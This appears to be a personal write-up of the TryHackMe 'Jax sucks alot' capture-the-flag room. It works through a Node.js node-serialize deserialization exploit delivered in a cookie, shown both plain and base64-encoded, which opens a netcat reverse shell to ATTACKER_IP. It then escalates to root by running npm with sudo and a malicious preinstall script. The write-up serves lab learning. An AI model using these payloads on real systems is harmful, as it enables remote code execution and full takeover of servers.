---
parent: "[[CTFs - THM]]"
resources:
---

```bash
# PLATFORM          . THM
# CTF NAME          Jax sucks alot.............
# DESCRIPTION       In JavaScript everything is a terrible mistake.
# DIFFICULTY        Easy
# CTF LINK          https://tryhackme.com/r/room/jason
```

```bash
sudo nmap -sSVC -T5 -p- 10.10.174.222 -oN jax
```

```
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 5b2d9d60a745de7a99203e4294ce193c (RSA)
|   256 bf32780183af785ee7fe9c834a7daa6b (ECDSA)
|_  256 12ab1380e5ad7307c848d5ca7c7de0af (ED25519)

80/tcp open  http
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Fri, 12 Apr 2024 20:27:45 GMT
|     Connection: close
|     <html><head>
|     <title>Horror LLC</title>
|     <style>
|     body {
|     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
|     background-size: 300% 300%;
|     -webkit-animation: Background 10s ease infinite;
|     -moz-animation: Background 10s ease infinite;
|     animation: Background 10s ease infinite;
|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|_    background-posi
|_http-title: Horror LLC
```

- In the source page's code we find the following script

```
document.getElementById("signup").addEventListener("click", function() {
	var date = new Date();
    	date.setTime(date.getTime()+(-1*24*60*60*1000));
    	var expires = "; expires="+date.toGMTString();
    	document.cookie = "session=foobar"+expires+"; path=/";
    	const Http = new XMLHttpRequest();
        console.log(location);
        const url=window.location.href+"?email="+document.getElementById("fname").value;
        Http.open("POST", url);
        Http.send();
	setTimeout(function() {
		window.location.reload();
	}, 500);
    });
```

- Whatever email is inputted, it is converted as base64 and added as a cookie. However, except the base64 conversion, this is pretty much useless knowledge.

- The idea this room revolves around is [[Data Serialisation|data serialization and deserialization]]. 

- In NodeJS, untrusted data passed to `unserialize()` function in the `node-serialize` module can lead to RCE. 

- This happens when a serialized JS Object is passed to the object and it's invoked immediately - `()` at the end. 

- After some googling around, I found the syntax needed to achieve this

```json
{"payload":"_$$ND_FUNC$$_function(){ require('child_process').execSync(\"<command>\",function puts(error, stdout, stderr){});}()"}
```

- So I ended up with 

```json
{"payload":"_$$ND_FUNC$$_function(){ require('child_process').execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 > /tmp/f\",function puts(error, stdout, stderr){});}()"}
```

- Then, I've encoded it to base 64, resulting in the following value

```
eyJwYXlsb2FkIjoiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjExLjUzLjQ2IDQ0NDQgPiAvdG1wL2ZcIixmdW5jdGlvbiBwdXRzKGVycm9yLCBzdGRvdXQsIHN0ZGVycil7fSk7fSgpIn0=
```

- I've changed the current cookie with the value above and I received a connection

>[!TIP]
> We can use the non-encoded payload as an input for the email box, leaving the server to do the base64 encoding and cookie updating part, resulting in the same behaviour.

```
Listening on 0.0.0.0 4444
Connection received on 10.10.174.222 47974
/bin/sh: 0: can't access tty; job control turned off
$ whoami
dylan
```

- After stabilizing the shell, I noticed that I can run `/usr/bin/npm *` as root without using a password.

```
dylan@jason:~$ sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```

- After consulting with [GTFObins](https://gtfobins.github.io/gtfobins/npm/#sudo), I've managed to escalate privileges to root

```
dylan@jason:~$ TF=$(mktemp -d)
dylan@jason:~$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
dylan@jason:~$ sudo /usr/bin/npm -C $TF --unsafe-perm i

> @ preinstall /tmp/tmp.CJRZEEQsEs
> /bin/sh

# whoami
root
```

- The user flag is in `/home/dylan/user.txt`.
- The root flag is in `/root/root.txt`.

